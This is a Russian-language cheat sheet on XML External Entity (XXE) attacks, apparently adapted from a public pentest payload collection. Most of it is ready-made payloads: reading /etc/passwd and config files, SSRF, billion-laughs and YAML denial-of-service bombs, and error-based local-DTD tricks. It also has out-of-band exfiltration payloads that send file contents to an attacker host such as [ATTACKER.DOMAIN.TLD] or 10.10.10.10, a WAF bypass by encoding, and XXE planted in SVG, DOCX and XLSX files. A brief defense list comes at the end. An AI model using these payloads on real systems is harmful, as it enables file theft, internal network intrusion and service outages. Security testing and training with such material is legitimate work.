**Внешние сущности XML (XXE)**

> Атака типа XML External Entity — это атака на приложение, которое разбирает XML-ввод и разрешает XML-сущности. XML-сущности можно использовать, чтобы заставить XML-парсер получить определённое содержимое на сервере.

*   [Инструменты](#Инструменты)
*   [Обнаружение уязвимости](#Обнаружение-уязвимости)
*   [Эксплуатация XXE для получения файлов](#Эксплуатация-XXE-для-получения-файлов)
    *   [Классическая XXE](#Классическая-XXE)
    *   [Классическая XXE с кодировкой Base64](#Классическая-XXE-с-кодировкой-Base64)
    *   [PHP-обёртка внутри XXE](#PHP-обёртка-внутри-XXE)
    *   [Атаки через XInclude](#Атаки-через-XInclude)
*   [Эксплуатация XXE для выполнения SSRF-атак](#Эксплуатация-XXE-для-выполнения-SSRF-атак)
*   [Эксплуатация XXE для выполнения атаки отказа в обслуживании](#Эксплуатация-XXE-для-выполнения-атаки-отказа-в-обслуживании)
    *   [Атака «Миллиард смехов»](#Атака-Миллиард-смехов)
    *   [YAML-атака](#YAML-атака)
    *   [Атака «Параметрический смех»](#Атака-Параметрический-смех)
*   [Эксплуатация XXE на основе ошибок](#Эксплуатация-XXE-на-основе-ошибок)
    *   [На основе ошибок — с использованием локального DTD-файла](#На-основе-ошибок-с-использованием-локального-DTD-файла)
        *   [Локальный DTD в Linux](#Локальный-DTD-в-Linux)
        *   [Локальный DTD в Windows](#Локальный-DTD-в-Windows)
    *   [На основе ошибок — с использованием удалённого DTD](#На-основе-ошибок-с-использованием-удалённого-DTD)
*   [Эксплуатация слепой XXE для эксфильтрации данных вне полосы (Out of Band)](#Эксплуатация-слепой-XXE-для-эксфильтрации-данных-вне-полосы-Out-of-Band)
    *   [Базовая слепая XXE](#Базовая-слепая-XXE)
    *   [Внеполосная XXE (Out of Band XXE)](#Внеполосная-XXE-Out-of-Band-XXE)
    *   [XXE OOB с DTD и PHP-фильтром](#XXE-OOB-с-DTD-и-PHP-фильтром)
    *   [XXE OOB с Apache Karaf](#XXE-OOB-с-Apache-Karaf)
*   [Обходы WAF](#Обходы-WAF)
    *   [Обход через кодировку символов](#Обход-через-кодировку-символов)
    *   [XXE на JSON-эндпоинтах](#XXE-на-JSON-эндпоинтах)
*   [XXE в экзотических файлах](#XXE-в-экзотических-файлах)
    *   [XXE внутри SVG](#XXE-внутри-SVG)
    *   [XXE внутри SOAP](#XXE-внутри-SOAP)
    *   [XXE внутри файла DOCX](#XXE-внутри-файла-DOCX)
    *   [XXE внутри файла XLSX](#XXE-внутри-файла-XLSX)
    *   [XXE внутри файла DTD](#XXE-внутри-файла-DTD)
*	[Защита](#Защита)   
*   [Лаборатории](#Лаборатории)
*   [Ссылки](#Ссылки)

# **Инструменты**

*   [staaldraad/xxeftp](https://github.com/staaldraad/xxeserv) — мини-веб-сервер с поддержкой FTP для XXE-пейлоадов
*   [lc/230-OOB](https://github.com/lc/230-OOB) — внеполосный XXE-сервер для получения содержимого файлов по FTP и генерации пейлоадов через http://xxe.sh/
*   [enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector) — инструмент для автоматической эксплуатации уязвимости XXE прямыми и различными внеполосными методами
*   [BuffaloWill/oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) — инструмент для встраивания XXE/XML-эксплойтов в различные типы файлов (DOCX/XLSX/PPTX, ODT/ODG/ODP/ODS, SVG, XML, PDF, JPG, GIF)
*   [whitel1st/docem](https://github.com/whitel1st/docem) — утилита для встраивания XXE- и XSS-пейлоадов в docx, odt, pptx и т.д.
*   [bytehope/wwe](https://github.com/bytehope/wwe) — PoC-инструмент (на основе wrapwrap и lightyear) для демонстрации XXE в PHP только с установленными флагами LIBXML_DTDLOAD или LIBXML_DTDATTR

# **Обнаружение уязвимости**

* `Внутренняя сущность`: если сущность объявлена внутри DTD, она называется внутренней сущностью. Синтаксис: `<!ENTITY entity_name "entity_value">`
```
DTD , или Document Type Definition - Он определяет тип XML-документа. С помощью него парсер проверяет документ на соответствие заранее заданной структуре.
	 <!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)> ]>В этом DTD корневой элемент email объявляется с помощью объявления типа ELEMENT. Затем обозначаются его дочерние элементы. 
```
* `Внешняя сущность`: если сущность объявлена вне DTD, она называется внешней сущностью. Обозначается через SYSTEM. Синтаксис: `<!ENTITY entity_name SYSTEM "entity_value">`

Базовая проверка сущностей: когда XML-парсер разбирает внешние сущности, результат должен содержать «John» в firstName и «Doe» в lastName. Сущности определяются внутри элемента DOCTYPE.

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

При отправке XML-пейлоада на сервер может помочь установка заголовка `Content-Type: application/xml`.

Это различные типы сущностей в XML:

| Тип | Префикс | Где используется |
| --- | --- | --- |
| Общая сущность | `&name;` | Внутри содержимого XML-документа |
| Параметрическая сущность | `%name;` | Только внутри DTD |

# **Эксплуатация XXE для получения файлов**

## **Классическая XXE**

Мы пытаемся отобразить содержимое файла `/etc/passwd`.

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

⚠️ SYSTEM и PUBLIC почти синонимы.

```xml
<!ENTITY % xxe PUBLIC "Random Text" "URL">
<!ENTITY xxe PUBLIC "Any TEXT" "URL">
```

## **Классическая XXE с кодировкой Base64**

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

## **PHP-обёртка внутри XXE**

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

## **Атаки через XInclude**

Когда вы не можете изменить элемент DOCTYPE, используйте XInclude для атаки:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

# **Эксплуатация XXE для выполнения SSRF-атак**

XXE можно комбинировать с уязвимостью SSRF для атаки на другую службу в сети.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

# **Эксплуатация XXE для выполнения атаки отказа в обслуживании**

⚠️: Эти атаки могут убить службу или сервер, не используйте их на продакшене.

## **Атака «Миллиард смехов»**

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

## **YAML-атака**

```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```

## **Атака «Параметрический смех»**

Вариант атаки «Миллиард смехов», использующий отложенную интерпретацию параметрических сущностей, от Себастьяна Пиппинга.

```xml
<!DOCTYPE r [
  <!ENTITY % pe_1 "<!---->">
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">
  <!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">
  %pe_4;
]>
<r/>
```

# **Эксплуатация XXE на основе ошибок**

## **На основе ошибок — с использованием локального DTD-файла**

Если возможна эксфильтрация на основе ошибок, вы всё ещё можете полагаться на локальный DTD для трюков с конкатенацией. Пейлоад для подтверждения, что сообщение об ошибке содержит имя файла.

```xml
<!DOCTYPE root [
    <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
    %local_dtd;
]>
<root></root>
```

*   GoSecure/dtd-finder — перечисляет DTD и генерирует XXE-пейлоады с использованием этих локальных DTD.

### **Локальный DTD в Linux**

Краткий список DTD-файлов, уже хранящихся в системах Linux; перечислите их с помощью `locate .dtd`:

*   `/usr/share/xml/fontconfig/fonts.dtd`
*   `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`
*   `/usr/share/xml/svg/svg10.dtd`
*   `/usr/share/xml/svg/svg11.dtd`
*   `/usr/share/yelp/dtd/docbookx.dtd`

Файл `/usr/share/xml/fontconfig/fonts.dtd` содержит инъектируемую сущность `%constant` в строке 148: `<!ENTITY % constant 'int|double|string|matrix|bool|charset|langset|const'>`

Итоговый пейлоад выглядит так:

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```

### **Локальный DTD в Windows**

Пейлоады из infosec-au/xxe-windows.md.

*   Раскрытие локального файла

```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>anything</xxx>
```

*   Раскрытие HTTP-ответа

```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'
    >
    %local_dtd;
  ]><xxx>anything</xxx>
```

## **На основе ошибок — с использованием удалённого DTD**

Пейлоад для запуска XXE:

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://[ATTACKER.DOMAIN.TLD]/ext.dtd">
    %ext;
]>
<message></message>
```

Содержимое ext.dtd:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Альтернативное содержимое ext.dtd:

```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; leak SYSTEM '%data;:///'>">
%eval;
%leak;
```

Разберём пейлоад:

*   `<!ENTITY % file SYSTEM "file:///etc/passwd">` — эта строка определяет внешнюю сущность с именем `file`, которая ссылается на содержимое файла `/etc/passwd` (файл Unix-подобной системы, содержащий данные учётных записей пользователей).
*   `<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">` — эта строка определяет сущность `eval`, которая содержит другое определение сущности. Эта другая сущность (`error`) предназначена для ссылки на несуществующий файл с добавлением содержимого сущности `file` (содержимого `/etc/passwd`) в конец пути к файлу. `&#x25;` — это URL-кодированный `%`, используемый для ссылки на сущность внутри определения сущности.
*   `%eval;` — эта строка использует сущность `eval`, что приводит к определению сущности `error`.
*   `%error;` — наконец, эта строка использует сущность `error`, которая пытается получить доступ к несуществующему файлу с путём, включающим содержимое `/etc/passwd`. Поскольку файл не существует, будет выброшена ошибка. Если приложение сообщает об ошибке пользователю и включает путь к файлу в сообщение об ошибке, то содержимое `/etc/passwd` будет раскрыто как часть сообщения об ошибке, раскрывая конфиденциальную информацию.

**Эксплуатация слепой XXE для эксфильтрации данных вне полосы (Out of Band)**

Иногда результат не выводится на странице, но вы всё равно можете извлечь данные с помощью внеполосной атаки.

## **Базовая слепая XXE**

Самый простой способ проверить наличие слепой XXE — попытаться загрузить удалённый ресурс, например, callback-эндпоинт, контролируемый тестировщиком.

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://[ATTACKER.DOMAIN.TLD]/x"> %ext;
]>
<r></r>
```

```xml
<!DOCTYPE root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>
<root>&test;</root>
```

Отправьте содержимое `/etc/passwd` на `http://[ATTACKER.DOMAIN.TLD]`, вы можете получить только первую строку.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY callhome SYSTEM "http://[ATTACKER.DOMAIN.TLD]/?%xxe;">
]
>
<foo>&callhome;</foo>
```

## **Внеполосная XXE (Out of Band XXE)**

*   Yunusov, 2013

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd">
<data>&send;</data>
```

Файл, хранящийся на `http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd`

```xml
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>">
%all;
```

## **XXE OOB с DTD и PHP-фильтром**

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://10.10.10.10/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
```

Файл, хранящийся на `http://10.10.10.10/dtd.xml`

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>">
```

## **XXE OOB с Apache Karaf**

CVE-2018-11788 затрагивает версии:

*   Apache Karaf <= 4.2.1
*   Apache Karaf <= 4.1.6

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://[ATTACKER.DOMAIN.TLD]"> %dtd;]
<features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto">
    </feature>
</features>
```

Отправьте XML-файл в папку deploy.

Ссылка: brianwrf/CVE-2018-11788

# **Обходы WAF**

## **Обход через кодировку символов**

XML-парсеры используют 4 метода определения кодировки:

1.  HTTP Content Type: `Content-Type: text/xml; charset=utf-8`
2.  Чтение Byte Order Mark (BOM)
3.  Чтение первых символов документа
    *   UTF-8 (3C 3F 78 6D)
    *   UTF-16BE (00 3C 00 3F)
    *   UTF-16LE (3C 00 3F 00)
4.  Объявление XML: `<?xml version="1.0" encoding="UTF-8"?>`

| Кодировка | BOM | Пример |
| --- | --- | --- |
| UTF-8 | EF BB BF | EF BB BF 3C 3F 78 6D 6C ...`<?xml` |
| UTF-16BE | FE FF | FE FF 00 3C 00 3F 00 78 00 6D 00 6C ...`<.?.x.m.l` |
| UTF-16LE | FF FE | FF FE 3C 00 3F 00 78 00 6D 00 6C 00 ..`<.?.x.m.l.` |

Пример: мы можем преобразовать пейлоад в UTF-16 с помощью iconv, чтобы обойти некоторые WAF:

```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

## **XXE на JSON-эндпоинтах**

В HTTP-запросе попробуйте переключить Content-Type с JSON на XML,

| Content Type | Данные |
| --- | --- |
| application/json | `{"search":"name","value":"test"}` |
| application/xml | `<?xml version="1.0" encoding="UTF-8" ?><root><search>name</search><value>data</value></root>` |

*   XML-документы должны содержать один корневой элемент (`<root>`), который является родителем всех остальных элементов.
*   Данные также должны быть преобразованы в XML, иначе сервер ответит ошибкой.

```json
{
  "errors":{
    "errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."
  }
}
```

*   NetSPI/Content-Type Converter

# **XXE в экзотических файлах**

## **XXE внутри SVG**

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>
```

Классический вариант:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

OOB через растеризацию SVG:

`xxe.svg`:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ELEMENT svg ANY >
<!ENTITY % sp SYSTEM "http://10.10.10.10:8080/xxe.xml">
%sp;
%param1;
]>
<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
      <flowRoot font-size="15">
         <flowRegion>
           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
         </flowRegion>
         <flowDiv>
            <flowPara>&exfil;</flowPara>
         </flowDiv>
      </flowRoot>
</svg>
```

`xxe.xml`:

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://10.10.10.10:2121/%data;'>">
```

## **XXE внутри SOAP**

```xml
<soap:Body>
  <foo>
  <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://10.10.10.10:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

## **XXE внутри файла DOCX**

Формат файла Open XML (внедрите пейлоад в любой .xml файл):

*   `/_rels/.rels`
*   `[Content_Types].xml`
*   Основная часть документа по умолчанию
    *   `/word/document.xml`
    *   `/ppt/presentation.xml`
    *   `/xl/workbook.xml`

Затем обновите файл `zip -u xxe.docx [Content_Types].xml`

Инструмент: https://github.com/BuffaloWill/oxml_xxe

*   DOCX/XLSX/PPTX
*   ODT/ODG/ODP/ODS
*   SVG
*   XML
*   PDF (экспериментально)
*   JPG (экспериментально)
*   GIF (экспериментально)

## **XXE внутри файла XLSX**

Структура XLSX:

```bash
$ 7z l xxe.xlsx
[...]
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00 .....          578          223  _rels/.rels
2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml
2021-10-17 15:19:00 .....          731          352  docProps/core.xml
2021-10-17 15:19:00 .....          410          246  docProps/app.xml
2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00              11216         3586  9 files
```

Извлеките файл Excel: `7z x -oXXE xxe.xlsx`

Пересоберите файл Excel:

```bash
cd XXE
zip -r -u ../xxe.xlsx *
```

> Предупреждение: используйте `zip -u` (https://infozip.sourceforge.net/Zip.html), а не `7z u` / `7za u` (https://p7zip.sourceforge.net/) или `7zz` (https://www.7-zip.org/), потому что они не пересожмут файл так же, и многие библиотеки разбора Excel не смогут распознать его как допустимый файл Excel. Допустимая сигнатура магических байтов (при `file XXE.xlsx`) будет показана как Microsoft Excel 2007+ (с `zip -u`), а недопустимая — как Microsoft OOXML. Альтернативно, с 7z можно указать правильный алгоритм сжатия: `7z a -tzip`, чтобы получить правильную сигнатуру.

Добавьте ваш слепой XXE-пейлоад внутрь `xl/workbook.xml`.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://10.10.10.10:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
```

Альтернативно, добавьте ваш пейлоад в `xl/sharedStrings.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://10.10.10.10:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
```

Использование удалённого DTD сэкономит нам время на пересборку документа каждый раз, когда мы хотим получить другой файл. Вместо этого мы один раз собираем документ, а затем меняем DTD. А использование FTP вместо HTTP позволяет получать гораздо большие файлы.

`xxe.dtd`

```xml
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>">
```

Обслуживайте DTD и принимайте FTP-пейлоад с помощью staaldraad/xxeserv:

```bash
xxeserv -o files.log -p 2121 -w -wd public -wp 8000
```

## **XXE внутри файла DTD**

Большинство описанных выше XXE-пейлоадов требуют контроля как над блоком DTD или DOCTYPE, так и над xml-файлом. В редких ситуациях вы можете контролировать только DTD-файл и не иметь возможности изменить xml-файл. Например, при MITM. Когда всё, что вы контролируете, — это DTD-файл, а xml-файлом вы не управляете, XXE всё ещё может быть возможна с этим пейлоадом.

```xml
<!-- Загрузить содержимое конфиденциального файла в переменную -->
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!-- Использовать эту переменную для создания HTTP GET-запроса с содержимым файла в URL -->
<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://[ATTACKER.DOMAIN.TLD]/x=%payload;">'>
%param1;
%external;
```

# * **Защита**
1. Большинство XXE-уязвимостей возникает из\-за того, что библиотека разбора XML-приложения поддерживает потенциально опасные XML-функции. В них приложение не нуждается, поэтому проще всего отключить эти функции:  
2. ссылки на внешние XML-сущности,  
3. поддержку XInclude,  
4. ссылки на пользовательские определения типов документов — DTD,  
5. обработку сущностей параметров.  
6. Это можно сделать с помощью конфигурационных опций или переопределив поведение по умолчанию.  
7. Обнови все компоненты, которые анализируют XML-вход. Это, например, SOAP — протокол обмена структурированными сообщениями в распределённой вычислительной среде, библиотека API.  
8. Обнови все процессоры документов или файлов, которые могут выполнять разбор XML. В том числе процессоры изображений и документов svg, docx или pdf.  
9. Используй новейшие библиотеки XML и компоненты веб\-разработки. Это снижает уровень веб\-уязвимости — XXE не исключение.  
10. В веб\-приложениях должна присутствовать корректная обработка исключений, а на веб\-серверах следует отключить отображение ошибок времени выполнения.  
11. Использовать и другие форматы — JSON или YAML. Откажись от стандартов API, основанных на XML, — например, SOAP. Используй вместо них API на основе JSON — например, REST. При этом не забывай о возможной подмене Content-Type со стороны клиента.  
12. Используй брандмауэры Web Application Firewalls — WAF. Полностью на них полагаться не стоит: это лишь часть защиты, а не её основа.

**Лаборатории**
















